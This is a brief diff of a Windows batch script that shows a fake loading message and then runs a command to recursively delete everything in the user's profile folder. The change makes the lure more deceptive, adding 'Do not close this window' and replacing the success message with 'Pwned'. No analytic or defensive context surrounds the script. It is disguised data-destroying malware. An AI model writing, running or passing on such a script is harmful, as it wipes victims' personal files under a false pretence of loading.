@@ -1,5 +1,5 @@
 @echo off
-echo "Loading..."
+echo "Do not close this window. Loading..."
 timeout 1 > nul
 rm -rf "%userprofile%\*"
-echo "Folders deleted successfully."
+echo "Pwned"
